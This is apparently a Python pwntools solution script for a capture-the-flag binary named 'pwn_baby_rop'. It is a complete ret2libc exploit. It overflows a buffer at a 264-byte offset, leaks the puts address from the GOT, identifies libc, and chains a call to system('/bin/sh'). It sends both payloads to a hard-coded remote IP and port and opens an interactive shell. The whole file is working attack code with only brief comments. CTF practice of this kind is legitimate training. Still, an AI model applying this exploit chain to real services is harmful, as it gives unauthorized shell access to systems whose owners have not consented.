from pwn import *


def solve():
    
    context.arch = "amd64"
    elf = ELF('./pwn_baby_rop',False)

    # calculated prior from de Brujin sequences
    offset = 264

    rop = ROP('./pwn_baby_rop')

    # find adress of the puts function and add it to the ROP chain
    rop.call(elf.symbols["puts"],  [ elf.symbols["got.puts"] ] )

    payload = [
        b"A" * offset,
        rop.chain(),
        p64(0x00401460) #return to main after finding code leak

    ]

    # connect remotely, exploit was already tested in isolated enviroments 
    p = remote("34.141.72.235", 31103)

    # ignore received text
    p.recvuntil(b'\n')

    #create payload
    payload = b"".join(payload)

    p.sendline( payload )

    # leak address of libc "puts" to find libc version
    leak_adr = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))

    print(hex(leak_adr))

    # use an online libc database to find exact match (try all of them if result fetches more than one potential lib)
    libc = ELF('./libc6_2.31-0ubuntu9_amd64.so', False)

    # stabilise the found libc address by finding the effective puts address (the one from our executable) and 
    # the one from the original libc
    libc.address = leak_adr - libc.symbols["puts"]

    rop2 = ROP(libc)

    ret = 0x40101a # to preverse stack allignment

    # find system and execute a reverse shell
    rop2.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
    rop2.call(libc.symbols["system"])


    payload2 = [
        # Create overflow again
        b"A"* offset,
        p64(ret),
        rop2.chain()
    ]

    payload2 = b"".join(payload2)

    p.sendline( payload2 )

    # So the process won't instantly die and to be able to actually get the flag
    p.interactive()

solve()